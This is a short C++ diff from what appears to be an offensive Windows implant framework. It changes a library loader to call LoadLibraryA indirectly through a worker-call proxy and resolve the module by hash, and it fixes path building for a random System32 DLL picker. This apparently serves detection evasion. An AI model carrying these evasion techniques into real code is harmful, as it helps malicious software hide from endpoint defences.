@@ -3,7 +3,16 @@
 auto DECLFN Library::Load(
     _In_ PCHAR LibName
 ) -> UPTR {
-    return (UPTR)Self->Krnl32.LoadLibraryA( LibName );
+
+    LOAD_CTX Context = { 
+        .LoadLibraryAPtr = (UPTR)Self->Krnl32.LoadLibraryA,
+        .LibraryName = (UPTR)LibName
+    };
+
+    Self->Spf->WorkCall( (UPTR)&Context, WkrLoadLibraryA );
+
+    return LdrLoad::Module( Hsh::Str<CHAR>( LibName ) );
+    // return (UPTR)Self->Krnl32.LoadLibraryA( LibName );
 }
 
 auto DECLFN Library::GetRnd( VOID ) -> PCHAR {
@@ -21,8 +30,8 @@ auto DECLFN Library::GetRnd( VOID ) -> PCHAR {
         Self->Krnl32.FindNextFileA( FindHandle, &FindData );
     }
 
-    Str::CopyA( ModulePath, "C:\\Windows\\System32\\" );
-    Str::CopyA( ModulePath+21, FindData.cFileName );
+    Str::ConcatA( ModulePath, "C:\\Windows\\System32\\" );
+    Str::ConcatA( ModulePath, FindData.cFileName );
 
     Self->Krnl32.FindClose( FindHandle );
 
